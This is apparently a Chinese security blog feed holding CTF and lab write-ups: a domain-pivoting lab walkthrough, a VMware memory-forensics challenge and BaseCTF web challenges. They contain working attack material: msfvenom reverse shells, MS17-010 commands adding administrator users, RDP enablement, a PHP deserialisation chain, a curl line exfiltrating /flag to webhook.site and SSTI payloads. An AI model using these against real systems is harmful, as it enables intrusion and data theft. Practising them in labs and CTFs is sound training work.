infoscan整个网段确实如此\n现在是administrator权限,可以尝试提到system权限\n上传个nc到c:\\windows\\temp目录\n弹过来没反应\nmimikatz抓取到密码\n尝试用psexec连接也不行\n查看一下系统信息,打了什么补丁\n使用梼杌中的ms14-058提权成功\n上面搞的好像是有点问题,Windows应该是3389远程桌面连接,重新搞下\n执行netstat -ano未发现3389端口开启\n1 2 3 4 5 6 通过以下命令查询注册表来查看 RDP 服务是否开启： REG QUERY \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections # 查看RDP服务是否开启: 1关闭, 0开启 REG QUERY \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\ WinStations\\RDP-Tcp\u0026#34; /v PortNumber # 查看 RDP 服务的端口 为1关闭\n使用命令REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026quot; \u0026quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f手动开启\n为0成功开启\n再使用命令配置一下防火墙允许连接\n1 netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow 接下来可以使用kali自带的xfreerdp进行连接,我这里为了后期渗透方便选择msf的\n先使用msfvenom组件生成一个马\n1 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.52.128 lport=4444 -f exe -o /root/Desktop/shell.exe 传上去执行后拿到meterpreter会话\n提权到system\n1 2 3 run post/windows/manage/enable_rdp #开启远程桌面 会生成一个文件，该文件可用来 再关闭远程桌面 run multi_console_command -r 文件地址 接下来做域内信息收集准备横向\n输入net view发现另外两台主机\n汇总一下信息\n1 2 3 4 5 6 7 8 9 10 域名:god.org 域控:OWA 域内用户三个: Administrator ligang liukaifeng01 域内主机三台: STU1(win7) 192.168.52.143 OWA 192.168.52.138 ROOT-TVI862UBEH 192.168.52.141 4.1 使用proxychains代理: 添加内网路由 run autoroute -s 192.168.52.0/24，查看一下arp缓存表存在52网段\nbackground返回一下,使用socks代理模块\n1 2 3 4 5 6 7 8 msf6 auxiliary(server/socks_proxy) \u0026gt; use auxiliary/server/socks_proxy msf6 auxiliary(server/socks_proxy) \u0026gt; show options msf6 auxiliary(server/socks_proxy) \u0026gt; set VERSION 5 VERSION =\u0026gt; 5 msf6 auxiliary(server/socks_proxy) \u0026gt; set username admin username =\u0026gt; admin msf6 auxiliary(server/socks_proxy) \u0026gt; set password admin msf6 auxiliary(server/socks_proxy) \u0026gt; run 重新开个终端vim /etc/proxychains.conf,如下配置\n返回msf6,输入proxychains curl http://192.168.52.143/yxcms/index.php,测试可以成功访问192.168.52.0网段\n4.2 CS直接建立socks5代理 右键点击机器-\u0026gt;代理转发-\u0026gt;socks代理,发现是62549端口\nproxifier检测成功,还是这个更方便点\n再在代理规则选择刚才那个即可\n4.3 渗透同域主机192.168.52.141 proxychains nmap -Pn 192.168.52.141\n通过445smb端口检测操作系统为Windows server2003,proxychains nmap -sV 192.168.52.141 -p 445\n搜了一下2003全是永恒之蓝\n先用第三个模块检测一下\n直接使用msf里面的攻击模块了(ms17-010)发现接收不了session,使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell。\n换用这个代码执行试试use auxiliary/admin/smb/ms17_010_command\n代码成功运行\n接下来执行如下命令\n1 2 3 4 5 6 set command net user gucheng !@#123qwe!@# /add #添加用户 run set command net localgroup administrators gucheng /add #管理员权限 run set command \u0026#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\u0026#39;\t#开启rdp run 使用rdesktop连接proxychains rdesktop 192.168.52.141\n连接成功\nmsf设置正反向shell都打不通不知道为啥,登个远程桌面算了\n4.4 打域控 扫描端口,发现445又开启了\n接下来执行如下命令\n1 2 3 4 5 6 7 8 set command net user gucheng2 !@#123qwe!@# /add #添加用户 run set command net localgroup administrators gucheng2 /add #管理员权限 run set command netsh advfirewall firewall add rule name=\u0026#34;Remote Desktop\u0026#34; protocol=TCP dir=in localport=3389 action=allow\t#开启防火墙端口 run set command \u0026#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\u0026#39;\t#开启rdp run 创建成功\nproxychains rdesktop 192.168.52.138 发现连接不了,端口filtered,裂开,这个msf的模块打不通不知道啥原因,以后再研究艹\n","date":"2024-12-08T12:19:00+08:00","permalink":"https://2477231995.github.io/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/","title":"红日内网靶场1"},{"content":"目前做过的内存取证题不多,这道题难度较高具有启发意义,所以记录一下留作以后参照\n复现地址:\u0026lt;[陇剑杯 2021]机密内存（问1） | NSSCTF\u0026gt;\n知识了解之vmware虚拟机文件类型 思考过程 解压后拿到三个文件,vmem为分页备份文件, 其余两个文件类型暂时不清楚. 先尝试提取发现果然是不行的\n接下来看看另外两个文件\n打开Encryption.bin01发现为一个二进制文件\n根据文件大小数千kb和本地的vmss文件(虚拟机挂起时记录状态的文件)进行对比判断Encryption.bin01为vmss文件\n将Encryption.bin01文件重命名为mem_secret-963a4663.vmss，vmss文件的文件名一定要和vmem文件名对应，否则无法读取挂起的状态\n然后打开Encryption.bin02文件发现一半是某种加密可见字符串,另一半出现较多乱码\n将后半中的未加密字符串进行搜索发现提到加密和vmx文件\n打开本地kali的vmx文件发现是一些配置,由此看来是对配置信息进行了加密\n拿我本地另一台机器加密实验一下\n加密后打开确实发现大量加密字符串,但是头部发现了一些信息是bin02文件没有的,判断部分关键信息被出题人删了,我们需要进行修复. 还有在vmx加密文件中未发现不可见字符串,所以判断bin02文件后半部分是另外一个文件\n使用010将后半段单独提出来到一个16进制文本,\n将关键字lsilogic丢入gpt,因为我们已经判断出前半部分为vmx文件,所以我们与vmdk文件作对比看看\n经过比对发现大量相似特征,010导出后命名为vmem文件名+vmdk\n注意: 这里一定要摆脱刻板印象,不是所有vmdk文件都很大!\n接下来就是修复vmx文件然后尝试挂载该虚拟机然后解除加密即可得到明文文件进行内存取证\n以下地方需要进行修复, 按照本地加密的样本来进行修复bin02文件\n上面已经将后半部分提取出去, 直接改为vmx文件, 至此完成修复工作\n解除密码保护 吐了这里,开始少打了一个空格一直导不进去md\nvmx文件内容\n1 2 3 4 .encoding = \u0026#34;GBK\u0026#34; displayName = \u0026#34;buzhidao\u0026#34; encryption.keySafe = \u0026#34;vmware:key/list/(pair/(phrase/Dg7Se8rqkNI%3d/pass2key%3dPBKDF2%2dHMAC%2dSHA%2d1%3acipher%3dAES%2d256%3arounds%3d10000%3asalt%3d%2b21PdYUqEQd1wdT2AoPEQw%253d%253d,HMAC%2dSHA%2d1,CgKwC5U7lfLjpVohwbpxufC11yU4a0%2byrP08oY0KDDcP1NL%2fRiLojwTz2JnYqm7baAhtgENYUeFUHXwODjSClaJ%2bSRBhKw6UwET6p3AYK8vs4T0cBrvTjYSrs0baLgG7dozcvL5JxA%2fKYJvriz4Mf%2bMmVvE%3d))\u0026#34; encryption.data =\u0026#34;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\u0026#34; 提示虚拟机加密, 可以使用这个项目来尝试破解密码https://github.com/axcheron/pyvmx-cracker\n命令:\npython39 .\\pyvmx-cracker.py -v mem_secret.vmx -d wordlist.txt\n得到密码:1q2w3e4r\n接下来就是移除加密\n结果却发现无法移除加密,磁盘问题,说明vmdk文件仍然存在问题\n恢复vmdk 这个界面很明显是win10\n通过之前的比对我们现在需要一个合法的文件头与填充。所以重新创建一个win10虚拟机，此时并不需要去安装win10系统（因为我们的目的只是获取到正确的vmdk文件，VMware在我们安装系统前便已经为我们生成），再用任意的密码加密这个win10虚拟机得到同一密码加密后的完整的vmdk文件，试着用得到的完整的vmdk文件修复原来那个分离出来的残缺vmdk\nwin10 iso镜像下载点https://www.microsoft.com/zh-cn/software-download/windows10\n下载步骤如下:\n坑1 新建一个Win10虚拟机,这里有个坑，记录一下：我们发现这里不能选择拆分成多个文件，否则会导致有多个vmdk，同时内部格式也会与单个vmdk有所不同，最后也试过无法移除加密。\n除了下面这个其他全部默认就好, 磁盘不够的话给个30就行,不用装系统\n选择15系的\n进行加密,我还是用的相同的密码:1q2w3e4r\n打开题目附件里的损坏vmdk将0x18前的部分全部删除\n接下来找到本地的win10 vmdk文件拖入010\n找到偏移地址0x200处, 将光标移到0x18前面, 然后通过左上角 “编辑-插入/覆盖-覆盖文件\u0026quot;选取破损vmdk覆盖\n覆盖后在偏移地址0x220处覆盖字节为vmware达成格式\n覆盖后:\n接着重命名此vmdk文件，此时虚拟机修复完成，将其放到被加密的虚拟机目录下。\n这里还有个坑：修复完成后不要试图开启虚拟机，否则vmem文件会被删除。\n在访问控制中移除加密成功\n内存取证 终于成功加载了!\n这道题好像只能用vol3,vol2不行\n问1 取证人员首先对容器的基本信息进行核实，经过确定该容器的基本信息为________。（答案为32位小写md5(容器操作系统系统的版本号+容器主机名+系统用户名），例如：操作系统的版本号为10.0.22449，容器主机名为DESKTOP-0521,系统登录用户名为admin，则该题答案为32位小写md5(10.0.22449DESKTOP-0521admin) 的值ae278d9bc4aa5ee84a4aed858d17d52a)。得到的flag请使用NSSCTF{}格式提交。\n利用一把梭工具得到主机名和用户\n还是导出注册表然后使用wrr工具分析注册表\n将10.0.18363DESKTOP-4N21ET2Adomd5加密后得到flag\n然而提交不对,看官方wp里面是6.3.18362 , 不知道哪出了问题\n问2 黑客入侵容器后曾通过木马控制端使用Messagebox发送过一段信息，该信息的内容是____________。（答案为Messagebox信息框内内容）。得到的flag请使用NSSCTF{}格式提交。\n挂起页面已经显示出来了, Best_hacker\n问3 经过入侵分析发现该容器受到入侵的原因为容器使用人的违规进行游戏的行为，该使用人进行游戏程序的信息是__________。（答案为“32位小写md5(游戏程序注册邮箱+游戏程序登录用户名+游戏程序登录密码)，例如：注册邮箱为adol@163.com,登录用户名为user,密码为user1234，则该题答案为” adol@163.comuseruser1234”的小写md5值5f4505b7734467bfed3b16d5d6e75c16)。得到的flag请使用NSSCTF{}格式提交。\n从快照和安装软件可以看到使用了steam\n拖到kali用正则搜索镜像中的邮箱\n命令:\nstrings mem_secret-963a4663.vmem | grep -E \u0026quot;[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}\u0026quot;\n发现邮箱john@uuf.me多次在路径中出现而且存在该邮箱命名的文件夹,多半为用户邮箱\n使用命令查找账号密码,拿到notepad++搜一下找到账号密码请求\nstrings mem_secret-963a4663.vmem -n 10 |grep -C 3 \u0026quot;password\u0026quot;\u0026gt;mem_secret-963a4663_output.txt\n将john@uuf.mejock_you1jock.2021 md5加密即可得到flag\n问4 经过入侵分析发现该容器曾被黑客植入木马控制的信息是_________。（答案为“32位小写md5(木马程序进程名+木马回连ip地址+木马回连ip端口）”，例如：木马程序进程名为svhost.exe，木马回连ip为1.1.1.1，木马回连端口为1234，则该题答案为“svhost.exe1.1.1.11234”的32位小写md5值f02da74a0d78a13e7944277c3531bbea)。得到的flag请使用NSSCTF{}格式提交\n根据第三题可以判断是攻击者通过映像劫持等技术造成机主在启动steam的时候马儿也生效了,我就直接先看异常对外连接再看进程了,因为进程多半伪装了没那么好找\n发现异常对外连接,确定ip为192.168.241.147,回连端口为8808\n进程列表搜索steam,玩过steam的都知道steam.exe还有很多其他服务比如steamhelper\n第二个steam.exe单一个进程, 判断此进程为异常进程\n将steam.exe192.168.241.1478808MD5加密得到flag\n问5 经过入侵分析，发现黑客曾经运行过痕迹清除工具，该工具运行的基本信息是________。（答案为“32为小写md5”(痕迹清除工具执行程序名+最后一次运行时间)，例如：黑客运行工具执行程序名为run.exe，运行时间为2021-07-10 10:10:13，则本题的答案为小写的32位md5(run.exe2021-07-10 10:10:13) 值为82d7aa7a3f1467b973505702beb35769，注意：本题中运行时间的格式为yy-mm-dd hh:mm:ss，时间时区为UTC+8）。得到的flag请使用NSSCTF{}格式提交。\n最后这个用vol3找不出,vol2.6跑不了,看官方wp用的2.61,直接丢答案了\n1 python2 vol.py -f mem_secret-963a4663.vmem --profile=Win10x64_18362 userassist 答案为md5(Wywz.exe2021-09-1021:10:13)\nd46586ca847e6be1004037bc288bf60c\n","date":"2024-11-30T12:56:25+08:00","permalink":"https://2477231995.github.io/p/%E9%99%87%E5%89%91%E6%9D%AF2021%E6%9C%BA%E5%AF%86%E5%86%85%E5%AD%98%E5%A4%8D%E7%8E%B0/","title":"[陇剑杯2021]机密内存复现"},{"content":"[Week2] Really EZ POP 这道题记录一下的原因是因为这个php版本太低导致我们不能通过更改成员变量的属性来构造pop利用链，开始我就犯了这个错。不能改变属性但可以使用在类内部写入构造方法来构造链子\nwp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 error_reporting(0); class Sink { private $cmd = \u0026#39;echo 123;\u0026#39;; public function __construct() { $this-\u0026gt;cmd = \u0026#39;system(\\\u0026#39;cat /flag\\\u0026#39;);\u0026#39;; } public function __toString() { eval($this-\u0026gt;cmd); } } class Shark { private $word = \u0026#39;Hello, World!\u0026#39;; public function __construct() { $this-\u0026gt;word = new Sink(); } public function __invoke() { echo \u0026#39;Shark says:\u0026#39; . $this-\u0026gt;word; } } class Sea { public $animal; public function __construct() { $this-\u0026gt;animal = new Shark(); } public function __get($name) { $sea_ani = $this-\u0026gt;animal; echo \u0026#39;In a deep deep sea, there is a \u0026#39; . $sea_ani(); } } class Nature { public $sea; public function __construct() { $this-\u0026gt;sea = new Sea(); } public function __destruct() { echo $this-\u0026gt;sea-\u0026gt;see; } } $ser = new Nature(); echo urlencode(serialize($ser)); [Week2] 所以你说你懂 MD5? 这道题当时是真不会哈希长度扩展攻击，题目源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 \u0026lt;?php session_start(); highlight_file(__FILE__); // 所以你说你懂 MD5 了? $apple = $_POST[\u0026#39;apple\u0026#39;]; $banana = $_POST[\u0026#39;banana\u0026#39;]; if (!($apple !== $banana \u0026amp;\u0026amp; md5($apple) === md5($banana))) { die(\u0026#39;加强难度就不会了?\u0026#39;); } // 什么? 你绕过去了? // 加大剂量! // 我要让他成为 string $apple = (string)$_POST[\u0026#39;appple\u0026#39;]; $banana = (string)$_POST[\u0026#39;bananana\u0026#39;]; if (!((string)$apple !== (string)$banana \u0026amp;\u0026amp; md5((string)$apple) == md5((string)$banana))) { die(\u0026#39;难吗?不难!\u0026#39;); } // 你还是绕过去了? // 哦哦哦, 我少了一个等于号 $apple = (string)$_POST[\u0026#39;apppple\u0026#39;]; $banana = (string)$_POST[\u0026#39;banananana\u0026#39;]; if (!((string)$apple !== (string)$banana \u0026amp;\u0026amp; md5((string)$apple) === md5((string)$banana))) { die(\u0026#39;嘻嘻, 不会了? 没看直播回放?\u0026#39;); } // 你以为这就结束了 if (!isset($_SESSION[\u0026#39;random\u0026#39;])) { $_SESSION[\u0026#39;random\u0026#39;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)); } // 你想看到 random 的值吗? // 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧 $random = $_SESSION[\u0026#39;random\u0026#39;]; echo md5($random); echo \u0026#39;\u0026lt;br /\u0026gt;\u0026#39;; $name = $_POST[\u0026#39;name\u0026#39;] ?? \u0026#39;user\u0026#39;; // check if name ends with \u0026#39;admin\u0026#39; if (substr($name, -5) !== \u0026#39;admin\u0026#39;) { die(\u0026#39;不是管理员也来凑热闹?\u0026#39;); } $md5 = $_POST[\u0026#39;md5\u0026#39;]; if (md5($random . $name) !== $md5) { die(\u0026#39;伪造? NO NO NO!\u0026#39;); } // 认输了, 看样子你真的很懂 MD5 // 那 flag 就给你吧 echo \u0026#34;看样子你真的很懂 MD5\u0026#34;; echo file_get_contents(\u0026#39;/flag\u0026#39;); 第一个比较可以利用传入数组，因为md5函数不能处理数组返回null，两个null自然相等\n第二个比较是弱比较，我们可以利用科学计数法0e开头的字符串传参进行绕过\n第三个比较用了string强制类型转换，我们可以使用工具fastcoll生成两个md5值相同的字符串，原理就是原本payload字符串中含有多种空白符号，MD5加密后hash值相等(空白符号不影响md5值)。但是我们上传参数时会自动进行一次url解码，这样过后因为空白字符两个url就不相等了，从而成功绕过，也可以上网找一些相等的，我这里给出一组\n1 2 3 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 \u0026amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 后面的知识就涉及到哈希长度拓展攻击了\n参考文章: https://luoingly.top/post/md5-length-extension-attack/\nhttps://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html\n全局变量random长度为96\n而name由我们传入可控，后面还会和md5($random)拼接，我们可以构造payload进行填充让新建一个分组包含后面需要验证的admin\n这里使用工具生成了，我是菜比\n先输入random的文本长度，然后是random的hash，最后是我们希望拓展的字符串\n生成后选择url编码一次的payload，浏览器会自动对我们传递的参数进行一次解码。\n然后再传入新的hash，虽然字符串上看起来不一样，但在md5分组运算的时候是一样的，所以两个md5判断为相等，由此拿到flag\n[Week2] 你听不到我的声音 这道题是一个无回显的RCE利用，方法有很多种\n重定向到文件 导入到txt文件我们就可以进行访问了\n1 cat/cp/mv /flag \u0026gt; 1.txt 利用curl命令和[webhook](Webhook.site - Test, transform and automate Web requests and emails)进行信息外带出flag payload\n1 curl https://webhook.site/44f66666-8c8a-47bd-978a-84f7a596c7ff/`cat /flag | base64` 直接写马 写马, 用 wget, curl 下载木马然后webshell管理工具连接\n[Week2] 数学大师 这道题我就只贴脚本了\n我的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import re import requests s = requests.Session() # 使用Session对象 url = \u0026#39;http://challenge.basectf.fun:37945/\u0026#39; res = s.get(url=url) #get请求如果放到循环体相等于打开五十个页面了，我们只需在循环体里更新用于匹配计算式的文本即可 string = res.text for i in range(50): # 提取算术表达式 pattern = r\u0026#39;second ([\\d×÷+-/]+)\u0026#39; matches = re.findall(pattern, string) expression = matches[0].replace(\u0026#39;×\u0026#39;, \u0026#39;*\u0026#39;).replace(\u0026#39;÷\u0026#39;, \u0026#39;/\u0026#39;) # 计算表达式 result = int(eval(expression)) r = s.post(url=url, data={\u0026#39;answer\u0026#39;: result}) print(r.text) # 更新页面内容 string = r.text 官方wp的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import requests import re req = requests.session() url = \u0026#34;http://challenge.basectf.fun:24989/\u0026#34; answer = 0 while True: response = req.post(url , data={\u0026#34;answer\u0026#34;: answer}) print(response.text) if \u0026#34;BaseCTF\u0026#34; in response.text: print(response.text) break regex = r\u0026#34; (\\d*?)(.)(\\d*)\\?\u0026#34; match = re.search(regex, response.text) if match.group(2) == \u0026#34;+\u0026#34;: answer = int(match.group(1)) + int(match.group(3)) elif match.group(2) == \u0026#34;-\u0026#34;: answer = int(match.group(1)) - int(match.group(3)) elif match.group(2) == \u0026#34;×\u0026#34;: answer = int(match.group(1)) * int(match.group(3)) elif match.group(2) == \u0026#34;÷\u0026#34;: answer = int(match.group(1)) // int(match.group(3)) [Week3] 复读机 这道题是ssti，模版引擎应该是jinja2,这里它必须以BaseCTF开头所以不能直接使用fengjing了。\n还过滤了双花括号，点和双引号和下划线\n寻找可用子类\n1 BaseCTF{%print(\u0026#39;\u0026#39;[\u0026#39;_\u0026#39;\u0026#39;_cl\u0026#39;\u0026#39;ass_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_ba\u0026#39;\u0026#39;se_\u0026#39;\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;\u0026#39;_subcla\u0026#39;\u0026#39;sses_\u0026#39;\u0026#39;_\u0026#39;]())%} 寻找一个含os模块能RCE的类，我这里懒得写脚本直接用Notepad++将逗号替换为换行符找到该模块的位置为137\n继续构造继承链查看当前作用域中的全局变量\n1 